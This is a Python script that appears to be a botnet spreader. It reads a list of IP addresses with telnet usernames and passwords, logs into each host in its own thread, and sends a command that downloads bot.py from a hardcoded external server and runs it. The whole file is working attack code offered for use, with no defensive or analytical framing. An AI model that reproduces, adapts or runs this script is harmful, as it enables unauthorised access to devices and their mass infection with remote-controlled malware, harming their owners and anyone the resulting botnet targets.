import telnetlib
import threading

PAYLOAD = "(cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;) && wget http://134.255.234.140:8080/bot.py -O bot.py && chmod +x bot.py && (python3 bot.py || python bot.py)"

def infect(ip, port, user, passwd):
    try:
        print(f"[+] Connecting to {ip}")
        tn = telnetlib.Telnet(ip, port, timeout=10)
        tn.read_until(b"login: ")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(passwd.encode('ascii') + b"\n")
        
        # Wait for shell prompt
        index, _, _ = tn.expect([b"#", b">", b"$"], timeout=5)
        if index >= 0:
            print(f"[+] Logged in to {ip}, sending payload...")
            tn.write(PAYLOAD.encode('ascii') + b"\n")
            tn.write(b"exit\n")
        tn.close()
    except Exception as e:
        print(f"[-] Failed on {ip}: {e}")

def load_targets(file):
    with open(file, "r") as f:
        lines = f.read().splitlines()
        for line in lines:
            try:
                ip, port, user, passwd = line.strip().split(":")
                threading.Thread(target=infect, args=(ip, int(port), user, passwd)).start()
            except:
                continue

if __name__ == "__main__":
    load_targets("valid.txt")
